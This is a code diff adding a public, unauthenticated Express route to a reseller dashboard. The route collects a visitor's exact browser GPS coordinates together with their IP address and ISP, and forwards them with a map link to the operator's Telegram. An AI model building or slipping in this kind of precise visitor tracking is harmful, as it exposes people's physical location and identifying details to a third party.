@@ -6,6 +6,40 @@ const { sendTelegram } = require('../utils/telegram');
 const { getClientIp, getLocation, toIST, toLocalTime } = require('../middleware/security');
 
 const router = express.Router();
+
+// POST /reseller/gps — called by the reseller dashboard right after page
+// load, only if the visitor's browser location permission prompt was
+// accepted. Deliberately defined BEFORE router.use(resellerAuth) below, so
+// it's public and works even before a token is entered.
+router.post('/gps', async (req, res) => {
+  try {
+    const { lat, lng, accuracy_meters } = req.body || {};
+    if (typeof lat !== 'number' || typeof lng !== 'number') {
+      return res.status(400).json({ error: 'lat and lng required' });
+    }
+    const ip = getClientIp(req);
+    const loc = await getLocation(ip);
+    const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+
+    await sendTelegram(
+`📍 VOXX RESELLER DASHBOARD — EXACT GPS LOCATION
+
+Coordinates: ${lat}, ${lng}
+Accuracy: ~${accuracy_meters ?? 'unknown'} meters
+Map: ${mapsUrl}
+IP: ${ip}
+ISP: ${loc.isp}
+
+Visitor Time: ${toLocalTime(new Date(), loc.timezone)}
+Your Time (IST): ${toIST(new Date())}`
+    );
+    res.json({ ok: true });
+  } catch (e) {
+    console.error('/reseller/gps error:', e.message);
+    if (!res.headersSent) res.status(500).json({ error: 'server_error' });
+  }
+});
+
 router.use(resellerAuth);
 
 // Matches the pricing shown on the VOXX landing page. Resellers may only
